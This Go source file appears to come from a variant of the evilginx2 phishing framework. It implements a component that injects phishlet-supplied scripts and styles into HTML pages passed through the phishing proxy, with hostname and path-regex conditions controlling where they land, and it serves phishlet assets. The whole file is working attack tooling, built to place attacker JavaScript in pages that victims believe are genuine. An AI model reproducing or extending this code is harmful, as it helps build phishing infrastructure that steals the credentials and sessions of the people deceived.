package core

import (
	"fmt"
	"io/ioutil"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/kgretzky/evilginx2/log"
)

type StaticInjector struct {
	phishlet *PhishletV2
}

func NewStaticInjector(phishlet *PhishletV2) *StaticInjector {
	return &StaticInjector{
		phishlet: phishlet,
	}
}

func (si *StaticInjector) InjectIntoResponse(body []byte, contentType string, hostname string, path string) []byte {
	if !strings.Contains(contentType, "text/html") {
		return body
	}

	bodyStr := string(body)

	// Inject Scripts
	for _, script := range si.phishlet.StaticFiles.Scripts {
		if si.shouldInject(script.InjectAt, script.InjectCondition, hostname, path) {
			content, err := si.getFileContent(script.Path)
			if err != nil {
				log.Error("failed to read script %s: %v", script.Path, err)
				continue
			}

			tag := ""
			if script.Inline {
				tag = fmt.Sprintf("<script>%s</script>", content)
			} else {
				// For simplicity, we inline everything for now as we don't have a dedicated script serving endpoint yet
				tag = fmt.Sprintf("<script>%s</script>", content)
			}

			bodyStr = si.injectTag(bodyStr, tag, script.InjectPosition)
		}
	}

	// Inject Styles
	for _, style := range si.phishlet.StaticFiles.Styles {
		if si.shouldInject(style.InjectAt, "", hostname, path) {
			content, err := si.getFileContent(style.Path)
			if err != nil {
				log.Error("failed to read style %s: %v", style.Path, err)
				continue
			}

			tag := fmt.Sprintf("<style>%s</style>", content)
			bodyStr = si.injectTag(bodyStr, tag, style.InjectPosition)
		}
	}

	return []byte(bodyStr)
}

func (si *StaticInjector) shouldInject(injectAt string, condition string, hostname string, path string) bool {
	// Check hostname
	if injectAt != "" && injectAt != hostname {
		if !strings.Contains(hostname, injectAt) {
			return false
		}
	}

	// Check condition
	if condition == "" || condition == "always" {
		return true
	}

	if strings.HasPrefix(condition, "path_matches:") {
		regex := strings.TrimPrefix(condition, "path_matches:")
		matched, err := regexp.MatchString(regex, path)
		if err == nil && matched {
			return true
		}
	}

	return false
}

func (si *StaticInjector) getFileContent(relativePath string) (string, error) {
	fullPath := filepath.Join(si.phishlet.Dir, relativePath)
	content, err := ioutil.ReadFile(fullPath)
	if err != nil {
		return "", err
	}
	return string(content), nil
}

func (si *StaticInjector) injectTag(body string, tag string, position string) string {
	switch position {
	case "head_start":
		return strings.Replace(body, "<head>", "<head>"+tag, 1)
	case "head_end":
		return strings.Replace(body, "</head>", tag+"</head>", 1)
	case "body_start":
		return strings.Replace(body, "<body>", "<body>"+tag, 1)
	case "body_end":
		return strings.Replace(body, "</body>", tag+"</body>", 1)
	default:
		// Default to head_end
		return strings.Replace(body, "</head>", tag+"</head>", 1)
	}
}

// IsAssetRequest checks if the request is for a static asset
func IsAssetRequest(path string, phishlet *PhishletV2) bool {
	for _, asset := range phishlet.StaticFiles.Assets {
		if asset.ServeAt == path {
			return true
		}
	}
	return false
}

// GetAssetContent retrieves the content and mime type of a static asset
func GetAssetContent(path string, phishlet *PhishletV2) ([]byte, string, bool) {
	for _, asset := range phishlet.StaticFiles.Assets {
		if asset.ServeAt == path {
			fullPath := filepath.Join(phishlet.Dir, asset.Path)
			content, err := ioutil.ReadFile(fullPath)
			if err != nil {
				log.Error("failed to read asset %s: %v", asset.Path, err)
				return nil, "", false
			}
			return content, asset.MimeType, true
		}
	}
	return nil, "", false
}
